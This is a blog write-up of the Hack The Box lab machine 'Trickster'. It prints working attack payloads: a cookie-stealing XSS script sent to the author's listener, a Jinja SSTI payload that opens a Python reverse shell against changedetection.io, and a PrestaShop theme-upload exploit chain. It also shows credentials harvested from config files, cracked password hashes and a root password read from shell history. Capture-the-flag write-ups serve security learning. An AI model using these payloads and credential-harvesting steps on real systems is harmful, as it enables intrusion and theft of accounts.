---
layout: post
title: "HTB: Trickster"
box: trickster
img: /img/trickster/trickster
author: Andrew Cherney
date: 2025-02-01
tags: htb medium-box season-6 linux webapp cve xss mysql john lotl ssh-tunneling ssti
icon: "assets/icons/trickster.png"
post_description: "To begin this box and get a shell a 2024 CVE can be used for RCE on the specific PrestaShop version. Inside of the PrestaShop config file the mysql database credentials can be found, and used thereafter to dump the admin password for cracking. As james a docker service can be enumerated to find a webpage change detection service, boasting another 2024 CVE. Through some SSTI the service can be exploited to get root inside of a docker container, which has a history of the true root password of the base machine."
---

# Summary

{{ page.post_description }}

# Enumeration

```bash
rustscan 10.10.11.34
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.11.34:22
Open 10.10.11.34:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80 10.10.11.34

Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-27 00:31 UTC
Initiating Ping Scan at 00:31
Scanning 10.10.11.34 [2 ports]
Completed Ping Scan at 00:31, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:31
Completed Parallel DNS resolution of 1 host. at 00:31, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 00:31
Scanning 10.10.11.34 [2 ports]
Discovered open port 80/tcp on 10.10.11.34
Discovered open port 22/tcp on 10.10.11.34
Completed Connect Scan at 00:31, 0.06s elapsed (2 total ports)
Nmap scan report for 10.10.11.34
Host is up, received syn-ack (0.061s latency).
Scanned at 2024-09-27 00:31:42 UTC for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
```


```bash
nmap -sCV -p22,80 10.10.11.34 
Starting Nmap 7.92 ( https://nmap.org ) at 2024-09-26 19:37 CDT
Nmap scan report for trickster.htb (10.10.11.34)
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA)
|_  256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: 403 Forbidden
Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.69 seconds
```

## Port 80

![port 80 front page]({{ page.img }}_01_80_front_page.png)

Nothing here that stands out as exploitable or even functional. That shop button corresponds to a shop.trickster.htb subdomain, so I add that to */etc/hosts* and head over.

## shop.trickster.htb

{% include img_link src="/img/trickster/trickster_02_80_shop_front_page" alt="front_page" ext="png" trunc=600 %}

PrestaShop is an open source e-commerce solution for building and managing online shops. I expect poking around here for it to function as a brand new install.

![product page Prestashop]({{ page.img }}_03_80_product_page.png)

![create account Prestashop]({{ page.img }}_04_80_create_account.png)

Yep basic functionality. I scan for some cves or vulns and come across a potential sql injection through the search parameter.

![Prestashop sql fuzz search]({{ page.img }}_05_80_shop_search_sql_fuzz.png)

There is an error here, I tried to let sqlmap poke around but there was no vulnerability only an unauthorized response. Surprisingly after all this time I had yet to do a dirsearch of this subdomain:

```bash
dirsearch -u http://shop.trickster.htb -x 503,403

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/6_Season/Trickster/reports/http_shop.trickster.htb/_24-09-26_20-05-54.txt

Target: http://shop.trickster.htb/

[20:05:54] Starting: 
[20:06:04] 404 -   42KB - /php.zip
[20:06:04] 404 -   42KB - /jsp.tar
[20:06:09] 404 -   42KB - /jsp.tgz
[20:06:35] 301 -  323B  - /.git  ->  http://shop.trickster.htb/.git/
[20:06:36] 200 -  460B  - /.git/info/
[20:06:36] 200 -  246KB - /.git/index
[20:06:37] 200 -   20B  - /.git/COMMIT_EDITMSG
[20:06:37] 200 -  240B  - /.git/info/exclude
[20:06:41] 200 -  613B  - /.git/
[20:06:38] 200 -   28B  - /.git/HEAD
[20:06:43] 200 -  491B  - /.git/logs/
[20:06:37] 200 -  413B  - /.git/branches/
[20:06:44] 200 -  163B  - /.git/logs/HEAD
[20:06:45] 200 -  112B  - /.git/config
[20:06:45] 301 -  333B  - /.git/logs/refs  ->  http://shop.trickster.htb/.git/logs/refs/
[20:06:47] 200 -  694B  - /.git/hooks/
[20:06:45] 301 -  339B  - /.git/logs/refs/heads  ->  http://shop.trickster.htb/.git/logs/refs/heads/
[20:06:48] 301 -  334B  - /.git/refs/heads  ->  http://shop.trickster.htb/.git/refs/heads/
[20:06:49] 200 -  462B  - /.git/refs/
[20:06:43] 200 -   73B  - /.git/description
[20:06:50] 301 -  333B  - /.git/refs/tags  ->  http://shop.trickster.htb/.git/refs/tags/
[20:08:51] 200 -    2KB - /.git/objects/
--[snip]--
```

### .git

Truth be told this isn't as big a blunder as not checking robots.txt on a webapp given it leaks this directory existed without a scan even needing to be performed.

![Prestashop .git]({{ page.img }}_06_80_shop_robots_txt.png)

.git effectively holds commits to repos within it, and although the files are not explicitly stored within the .git directory they can easily be reconstructed with a tool like git-dumper.

```bash
git-dumper http://shop.trickster.htb/ shop
[-] Testing http://shop.trickster.htb/.git/HEAD [200]
[-] Testing http://shop.trickster.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://shop.trickster.htb/.git/ [200]
[-] Fetching http://shop.trickster.htb/.gitignore [404]
[-] http://shop.trickster.htb/.gitignore responded with status code 404
[-] Fetching http://shop.trickster.htb/.git/logs/ [200]
[-] Fetching http://shop.trickster.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://shop.trickster.htb/.git/description [200]
[-] Fetching http://shop.trickster.htb/.git/HEAD [200]
[-] Fetching http://shop.trickster.htb/.git/refs/ [200]
[-] Fetching http://shop.trickster.htb/.git/hooks/ [200]
[-] Fetching http://shop.trickster.htb/.git/config [200]
---[snip]---
```

```bash
ls

admin634ewutrx1jgitlooaj  error500.html  init.php                 INSTALL.txt  Makefile
autoload.php              index.php      Install_PrestaShop.html  LICENSES


ls admin634ewutrx1jgitlooaj/

autoupgrade    cron_currency_rates.php  filemanager     get-file-admin.php  index.php   themes
backups        export                   footer.inc.php  header.inc.php      init.php
bootstrap.php  favicon.ico              functions.php   import              robots.txt
```

Seems the admin directory has a random string attached to it to make fuzzing borderline impossible.

# User as james

## shell as www-data

### CVE-2024-34716

Next step is to sift through [https://nvd.nist.gov/vuln/search/results?form_type=Basic&results_type=overview&query=prestashop&search_type=all&isCpeNameSearch=false](https://nvd.nist.gov/vuln/search/results?form_type=Basic&results_type=overview&query=prestashop&search_type=all&isCpeNameSearch=false) for potential vulnerabilities. When I did the box I did so prior to finding a version number, but for reference this is version 8.1.5

There exists an xss vulnerability within the contact us page in version 8.1.5, where an uploaded png with html inside will be treated like an html file and be executed upon opening. To test for this I make a simple file to retrieve a cookie that may or may not exist.

```html
<script>document.location='http://10.10.14.5:8081/?'+document.cookie</script>
```

![Prestashop xss test contact us form]({{ page.img }}_07_80_contact_us_xss_test.png)

```bash
httpserver 
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.11.34 - - [26/Sep/2024 21:15:55] "GET /? HTTP/1.1" 200 -
```

Well it is vulnerable and I have the potential here to host a malicious javascript file and run arbitrary code depending on how this form is constructed. I instead look at the existing payloads for the cve. [https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/](https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/) goes over in depth what the vulnerability chain is. I'll break it down here as well:

Upload a png with malicious javascript. That javascript will grab the admin token, then use that admin token to grab the csrf value. Then using both POST and these tokens a malicious theme with a reverse shell is imported. The list of things to achieve this using [https://github.com/aelmokhtar/CVE-2024-34716](https://github.com/aelmokhtar/CVE-2024-34716) are:

1. change reverse_shell.php IP and port to your liking
2. add reverse_shell.php to zip file
3. change exploit.html to admin location on site and local IP
4. change ncat to nc
5. setup an httpserver where the zip is
6. setup your own listener instead of the one this script makes

(In post the script seems to have changed)

```bash
httpserver 
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.11.34 - - [26/Sep/2024 21:38:28] "GET /ps_next_8_theme_malicious.zip HTTP/1.1" 200 -
```

```bash
python3 exploit.py 
[?] Please enter the URL (e.g., http://prestashop:8000): http://shop.trickster.htb
[?] Please enter your email: raccoon@raccoon.xyz
[?] Please enter your message: see attachment for problem
[?] Please provide the path to your HTML file: exploit.html
Serving at http.Server on port 5000
[X] Yay! Your exploit was sent successfully!
[X] Remember to python http server on port whatever port is specified in exploit.html 
	in directory that contains ps_next_8_theme_malicious.zip to host it.
[X] Once a CS agent clicks on attachment, you'll get a SHELL!
[X] Ncat is now listening on port 1234. Press Ctrl+C to terminate.
Listening on 0.0.0.0 1667
GET request to http://shop.trickster.htb/themes/next/reverse_shell.php: 403
GET request to http://shop.trickster.htb/themes/next/reverse_shell.php: 403
GET request to http://shop.trickster.htb/themes/next/reverse_shell.php: 200
```

```bash
nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.11.34 47156
Linux trickster 5.15.0-121-generic #131-Ubuntu SMP Fri Aug 9 08:29:53 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 02:50:37 up  2:40,  0 users,  load average: 1.04, 0.39, 0.24
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1167): Inappropriate ioctl for device
bash: no job control in this shell
www-data@trickster:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## ssh as james

### config files

```bash
www-data@trickster:~/prestashop$ ls /home
ls /home
adam
james
runner
```

```bash
www-data@trickster:~/prestashop$ find / -user adam 2>/dev/null
find / -user adam 2>/dev/null
/home/adam
www-data@trickster:~/prestashop$ find / -user james 2>/dev/null
find / -user james 2>/dev/null
/home/james
www-data@trickster:~/prestashop$ find / -user runner 2>/dev/null
find / -user runner 2>/dev/null
/proc/1170
/proc/1170/task
/proc/1170/task/1170
---[snip]---
/proc/17546/attr/smack
/proc/17546/attr/apparmor
/home/runner
/tmp/Crashpad

```

```bash
www-data@trickster:~/prestashop/config$ ls
ls
alias.php
autoload.php
bootstrap.php
config.inc.php
db_slave_server.inc.php
defines.inc.php
defines_uri.inc.php
index.php
services
settings.inc.php
smarty.config.inc.php
smartyadmin.config.inc.php
smartyfront.config.inc.php
themes
xml
```

```bash
www-data@trickster:~/prestashop/config$ cat db_slave_server.inc.php
cat db_slave_server.inc.php
<?php
/**
 * Copyright since 2007 PrestaShop SA and Contributors
 * PrestaShop is an International Registered Trademark & Property of PrestaShop SA
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.md.
 * It is also available through the world-wide-web at this URL:
 * https://opensource.org/licenses/OSL-3.0
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@prestashop.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade PrestaShop to newer
 * versions in the future. If you wish to customize PrestaShop for your
 * needs please refer to https://devdocs.prestashop.com/ for more information.
 *
 * @author    PrestaShop SA and Contributors <contact@prestashop.com>
 * @copyright Since 2007 PrestaShop SA and Contributors
 * @license   https://opensource.org/licenses/OSL-3.0 Open Software License (OSL 3.0)
 */

/*
return array(
    array('server' => '192.168.0.15', 'user' => 'rep', 'password' => '123456', 'database' => 'rep'),
    array('server' => '192.168.0.3', 'user' => 'myuser', 'password' => 'mypassword', 'database' => 'mydatabase'),
    );
*/

return array();
```

Searched through these manually before both realizing this wasn't the right config and that I can do it smarter. Those creds are fake and don't work in mysql. Oh right we should get a better shell so we can use mysql:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
stty raw -echo; fg
export TERM=xterm
script /dev/null -qc /bin/bash
```

Proof it didn't work:

```bash
www-data@trickster:/$ mysql -u myuser -p
Enter password: 
ERROR 1045 (28000): Access denied for user 'myuser'@'localhost' (using password: YES)
www-data@trickster:/$ mysql -u rep -p
Enter password: 
ERROR 1698 (28000): Access denied for user 'rep'@'localhost'
```

The smarter way to do it:

```bash
www-data@trickster:~/prestashop/app$ ls config
addons			config_legacy_test.yml	routing.yml
api_platform		config_prod.yml		routing_dev.yml
config.yml		config_test.yml		security_dev.yml
config_dev.yml		doctrine.yml		security_prod.yml
config_legacy.yml	parameters.php		security_test.yml
config_legacy_dev.yml	parameters.yml		services.yml
config_legacy_prod.yml	parameters.yml.dist	set_parameters.php
www-data@trickster:~/prestashop/app$ grep -iR "database"
config/doctrine.yml:        host: "%database_host%"
config/doctrine.yml:        port: "%database_port%"
config/doctrine.yml:        dbname: "%database_name%"
config/doctrine.yml:        user: "%database_user%"
config/doctrine.yml:        password: "%database_password%"
config/doctrine.yml:    naming_strategy: prestashop.database.naming_strategy
config/config_test.yml:        dbname: "test_%database_name%"
config/parameters.yml.dist:    database_host:     127.0.0.1
config/parameters.yml.dist:    database_port:     ~
config/parameters.yml.dist:    database_name:     prestashop
config/parameters.yml.dist:    database_user:     root
config/parameters.yml.dist:    database_password: ~
config/parameters.yml.dist:    database_prefix:   ps_
config/parameters.yml.dist:    database_engine: InnoDB
config/parameters.yml.dist:    # database_path: "%kernel.root_dir%/data.db3"
config/parameters.php:    'database_host' => '127.0.0.1',
config/parameters.php:    'database_port' => '',
config/parameters.php:    'database_name' => 'prestashop',
config/parameters.php:    'database_user' => 'ps_user',
config/parameters.php:    'database_password' => 'prest@shop_o',
config/parameters.php:    'database_prefix' => 'ps_',
config/parameters.php:    'database_engine' => 'InnoDB',
```

Now we go to mysql and dump the relevant table info.

```bash
www-data@trickster:~/prestashop/app$ mysql -u ps_user -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 8304
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| prestashop         |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use prestashop
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [prestashop]> show tables;
---[snip]---
| ps_currency_shop                                |
| ps_customer                                     |
| ps_customer_group                               |
| ps_customer_message                             |
| ps_customer_message_sync_imap                   |
| ps_customer_session                             |
| ps_customer_thread                              |
| ps_customization                                |
| ps_customization_field                          |
| ps_customization_field_lang                     |
| ps_customized_data                              |
| ps_date_range                                   |
| ps_delivery                                     |
| ps_emailsubscription                            |
| ps_employee                                     |
| ps_employee_session                             |
---[snip]---
```

I cropped the output for a good reason and I'll let you determine why. I go with customer off the bat, fatal mistake.

```bash
MariaDB [prestashop]> describe ps_customer;
+----------------------------+---------------------+------+-----+---------------------+----------------+
| Field                      | Type                | Null | Key | Default             | Extra          |
+----------------------------+---------------------+------+-----+---------------------+----------------+
| id_customer                | int(10) unsigned    | NO   | PRI | NULL                | auto_increment |
| id_shop_group              | int(11) unsigned    | NO   | MUL | 1                   |                |
| id_shop                    | int(11) unsigned    | NO   | MUL | 1                   |                |
| id_gender                  | int(10) unsigned    | NO   | MUL | NULL                |                |
| id_default_group           | int(10) unsigned    | NO   |     | 1                   |                |
| id_lang                    | int(10) unsigned    | YES  |     | NULL                |                |
| id_risk                    | int(10) unsigned    | NO   |     | 1                   |                |
| company                    | varchar(255)        | YES  |     | NULL                |                |
| siret                      | varchar(14)         | YES  |     | NULL                |                |
| ape                        | varchar(6)          | YES  |     | NULL                |                |
| firstname                  | varchar(255)        | NO   |     | NULL                |                |
| lastname                   | varchar(255)        | NO   |     | NULL                |                |
| email                      | varchar(255)        | NO   | MUL | NULL                |                |
| passwd                     | varchar(255)        | NO   |     | NULL                |                |
| last_passwd_gen            | timestamp           | NO   |     | current_timestamp() |                |
| birthday                   | date                | YES  |     | NULL                |                |
| newsletter                 | tinyint(1) unsigned | NO   |     | 0                   |                |
| ip_registration_newsletter | varchar(15)         | YES  |     | NULL                |                |
| newsletter_date_add        | datetime            | YES  |     | NULL                |                |
| optin                      | tinyint(1) unsigned | NO   |     | 0                   |                |
| website                    | varchar(128)        | YES  |     | NULL                |                |
| outstanding_allow_amount   | decimal(20,6)       | NO   |     | 0.000000            |                |
| show_public_prices         | tinyint(1) unsigned | NO   |     | 0                   |                |
| max_payment_days           | int(10) unsigned    | NO   |     | 60                  |                |
| secure_key                 | varchar(32)         | NO   |     | -1                  |                |
| note                       | text                | YES  |     | NULL                |                |
| active                     | tinyint(1) unsigned | NO   |     | 0                   |                |
| is_guest                   | tinyint(1)          | NO   |     | 0                   |                |
| deleted                    | tinyint(1)          | NO   |     | 0                   |                |
| date_add                   | datetime            | NO   |     | NULL                |                |
| date_upd                   | datetime            | NO   |     | NULL                |                |
| reset_password_token       | varchar(40)         | YES  |     | NULL                |                |
| reset_password_validity    | datetime            | YES  |     | NULL                |                |
+----------------------------+---------------------+------+-----+---------------------+----------------+
```

```bash
MariaDB [prestashop]> select email,passwd from ps_customer;
+----------------------+--------------------------------------------------------------+
| email                | passwd                                                       |
+----------------------+--------------------------------------------------------------+
| adam@trickster.htb   | $2y$10$kY2G39RBz9P0S48EuSobuOJba/HgmQ7ZtajfZZ3plVLWnaBbS4gei |
| anonymous@psgdpr.com | $2y$10$054Mo38DcRSLaMX9OhT5UuhYSQvorGu8nZb9GubbAv3Roei6RS2QW |
| pub@prestashop.com   | $2y$10$Cw68h0u8YeP6IiYRRaOjQu4AV7X9BTQL3ZK4CtHU16PNDg7LB4mEG |
| raccoon@raccoon.xyz  | $2y$10$69i9m0r66NREfcCA/0RfPuqvDkUU6G.1urpe9nAKHC2XgyY69lM5G |
+----------------------+--------------------------------------------------------------+
```

```bash
john hashes --wordlist=/opt/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:15 0.09% (ETA: 22:33:08) 0g/s 200.0p/s 200.0c/s 200.0C/s hottie21..bluejay
Session aborted
```

Those didn't crack so I looked a bit closer and saw an employee database. Probably should have gone there first as the admin wouldn't be a customer.

```bash
MariaDB [prestashop]> describe ps_employee;
+--------------------------+---------------------+------+-----+---------------------+----------------+
| Field                    | Type                | Null | Key | Default             | Extra          |
+--------------------------+---------------------+------+-----+---------------------+----------------+
| id_employee              | int(10) unsigned    | NO   | PRI | NULL                | auto_increment |
| id_profile               | int(10) unsigned    | NO   | MUL | NULL                |                |
| id_lang                  | int(10) unsigned    | NO   |     | 0                   |                |
| lastname                 | varchar(255)        | NO   |     | NULL                |                |
| firstname                | varchar(255)        | NO   |     | NULL                |                |
| email                    | varchar(255)        | NO   | MUL | NULL                |                |
| passwd                   | varchar(255)        | NO   |     | NULL                |                |
| last_passwd_gen          | timestamp           | NO   |     | current_timestamp() |                |
| stats_date_from          | date                | YES  |     | NULL                |                |
| stats_date_to            | date                | YES  |     | NULL                |                |
| stats_compare_from       | date                | YES  |     | NULL                |                |
| stats_compare_to         | date                | YES  |     | NULL                |                |
| stats_compare_option     | int(1) unsigned     | NO   |     | 1                   |                |
| preselect_date_range     | varchar(32)         | YES  |     | NULL                |                |
| bo_color                 | varchar(32)         | YES  |     | NULL                |                |
| bo_theme                 | varchar(32)         | YES  |     | NULL                |                |
| bo_css                   | varchar(64)         | YES  |     | NULL                |                |
| default_tab              | int(10) unsigned    | NO   |     | 0                   |                |
| bo_width                 | int(10) unsigned    | NO   |     | 0                   |                |
| bo_menu                  | tinyint(1)          | NO   |     | 1                   |                |
| active                   | tinyint(1) unsigned | NO   |     | 0                   |                |
| optin                    | tinyint(1) unsigned | YES  |     | NULL                |                |
| id_last_order            | int(10) unsigned    | NO   |     | 0                   |                |
| id_last_customer_message | int(10) unsigned    | NO   |     | 0                   |                |
| id_last_customer         | int(10) unsigned    | NO   |     | 0                   |                |
| last_connection_date     | date                | YES  |     | NULL                |                |
| reset_password_token     | varchar(40)         | YES  |     | NULL                |                |
| reset_password_validity  | datetime            | YES  |     | NULL                |                |
| has_enabled_gravatar     | tinyint(3) unsigned | NO   |     | 0                   |                |
+--------------------------+---------------------+------+-----+---------------------+----------------+
29 rows in set (0.001 sec)

MariaDB [prestashop]> select email,passwd from ps_employee;
+---------------------+--------------------------------------------------------------+
| email               | passwd                                                       |
+---------------------+--------------------------------------------------------------+
| admin@trickster.htb | $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C |
| james@trickster.htb | $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm |
+---------------------+--------------------------------------------------------------+
```

```bash
john hashes --wordlist=/opt/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alwaysandforever (?)
1g 0:00:00:03 DONE (2024-09-26 22:50) 0.2840g/s 10523p/s 10523c/s 10523C/s bandit2..alkaline
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

James hash cracked so we can ssh in for user.

```bash
ssh james@trickster.htb

The authenticity of host 'trickster.htb (10.10.11.34)' can't be established.
ECDSA key fingerprint is SHA256:KeXq0kjFB0f/ks6Zwb3+8hYoRPyXYWbWzHinBmAn5j0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'trickster.htb,10.10.11.34' (ECDSA) to the list of known hosts.
james@trickster.htb's password: 
james@trickster:~$ ls
user.txt
james@trickster:~$ cat user.txt
3e8625fa2966--------------------
```

# Root

## docker enum

Time to look around for anything out of the ordinary.

```bash
james@trickster:~$ ls /opt
containerd  google  PrusaSlicer
james@trickster:~$ ls /opt/PrusaSlicer/
prusaslicer  TRICKSTER.3mf
james@trickster:~$ file /opt/PrusaSlicer/TRICKSTER.3mf 
/opt/PrusaSlicer/TRICKSTER.3mf: Zip archive data, at least v2.0 to extract, compression method=deflate
james@trickster:~$ ls -al /opt/PrusaSlicer/
total 82196
drwxr-xr-x 2 root root     4096 Sep 13 12:24 .
drwxr-xr-x 5 root root     4096 Sep 13 12:24 ..
-rwxr-xr-x 1 root root 84018368 Sep  6  2023 prusaslicer
-rw-r--r-- 1 root root   138526 May 23 22:08 TRICKSTER.3mf
```

3d printer software, used for converting 3d models into G-code instructions for FFF printers or PGN layers for mSLA 3d printers ([read about here](https://github.com/prusa3d/PrusaSlicer)). There are far more buffer overflow than I was expecting to see but I opted to reserve this till I fully enumerate.

```bash
james@trickster:~$ ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:2e:5d:3f:4e  txqueuelen 0  (Ethernet)
        RX packets 91  bytes 5308 (5.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 27  bytes 1908 (1.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.34  netmask 255.255.254.0  broadcast 10.10.11.255
        ether 00:50:56:b0:fc:6b  txqueuelen 1000  (Ethernet)
        RX packets 243975  bytes 80081862 (80.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 205655  bytes 189149728 (189.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1221674  bytes 1537121418 (1.5 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1221674  bytes 1537121418 (1.5 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethcedff3c: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether fa:e3:0b:dd:1f:f9  txqueuelen 0  (Ethernet)
        RX packets 5  bytes 354 (354.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1  bytes 42 (42.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Hmm the webapp wasn't in docker so I wonder why this interface is up ...

### living off the land

Right now I have a basic shell and I wanted to take this opportunity to write down some LOTL scripts in case I wouldn't have real tools. First I needed a ping sweep, which can easily be done with a for loop and ping inside of one bash line.

```bash
james@trickster:~$ for i in {1..254};do (ping 172.17.0.$i -c 1 -w 5 >/dev/null && echo "172.17.0.$i" &);done
172.17.0.1
172.17.0.2
```

We have confirmed there is a container, now I need to know what ports are open. I can use /dev/PROTOCOL/IP/PORT to direct an echo to check for a response.

```bash
james@trickster:~$ (for port in {1..65535}; do (echo > /dev/tcp/172.17.0.2/$port) >& /dev/null && echo "Port $port seems to be open" & done;)
Port 5000 seems to be open
```

Time to ssh tunnel and try to access this, otherwise if I cannot I'll need to proxychain or something.

```bash
ssh james@trickster.htb -L 5000:172.17.0.2:5000
```

![change.io login page]({{ page.img }}_08_5000_front_page.png)

## change.io

### CVE-2024-34716

Change detection io is a service that can dynamically check for changes in sites or endpoints. When a change is detected notifications can be sent out, and those notifications baseline use templates. I have a solid idea what the next exploit might be. However I need access to the dashboard. Maybe the password for james??

![chamge.io dashboard]({{ page.img }}_09_5000_dashboard.png)

Always try to reuse passwords, people are animals who like simplicity and it's far too common for users to reuse passwords where they oughtn't. [https://www.reddit.com/r/opensource/comments/1coi0u2/remote_code_execution_in_changedetectionio/](https://www.reddit.com/r/opensource/comments/1coi0u2/remote_code_execution_in_changedetectionio/) is a reddit post about an RCE which links to another post, linking to yet another post of [https://blog.hacktivesecurity.com/index.php/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/](https://blog.hacktivesecurity.com/index.php/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/
) which actually dives into the exploit that uses, we guessed it, SSTI. 

Look at version on site, see 0.45.20, a crazy coincidence that the version that fixes this SSTI issue is 0.45.21

Anyway the attack chain here is fairly simple. Host an http server and setup a tracker for that server. Make the notification SSTI which executes a shell, then induce a change and recheck. The notification should trigger the payload and you should get a shell. After testing below is the payload:

{% raw %}
```python
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.2\",7777));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'").read()}}
{% endif %}
{% endfor %}
```
{% endraw %}


![change.io notifications ssti payload]({{ page.img }}_10_5000_notifications_ssti.png)

Now here I did some testing and needed to add `gets://` as the URL, I think it needed a place to send the notification and this tosses it at an empty API endpoint. Setup the server and a listened, then get a shell.

```bash
python3 -m http.server 8082
touch test
```

```bash
nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.11.34 42444
root@ae5c137aa8ef:/app# id
id
uid=0(root) gid=0(root) groups=0(root)
```

Excellent now I am root inside of docker. Why would I want this? Well there's a few misconfiguration or poor opsec opportunities that I can abuse. Maybe root left in an ssh key somewhere. Maybe there's a script with a backdoor that calls to a root API, or maybe root reused the same password and I can crack it/read it in plaintext from a script/history.

```bash
root@ae5c137aa8ef:/app# history
history
    1  apt update
    2  #YouC4ntCatchMe#
    3  apt-get install libcap2-bin
    4  capsh --print
    5  clear
    6  capsh --print
    7  cd changedetectionio/
    8  ls
    9  nano forms.py 
   10  apt install nano
   11  nano forms.py 
   12  exit
   13  capsh --print
   14  nano
   15  cd changedetectionio/
   16  nano forms.py 
   17  exit
   18  nano changedetectionio/flask_app.py 
   19  exit
   20  nano changedetectionio/flask_app.py 
   21  exit
   22  nano changedetectionio/flask_app.py 
   23  nano changedetectionio/static/js/notifications.js 
   24  exit
   25  id
   26  ls
   27  netstat -tunlp
   28  history
```

Normally history isn't useful in these engagements, but in a real life engagement history could tip off to various permissions the user has or endpoints that you might not have been able to enumerate quickly or efficiently. 

```bash
james@trickster:~$ su root
Password: 
root@trickster:/home/james# cd /root
root@trickster:~# ls
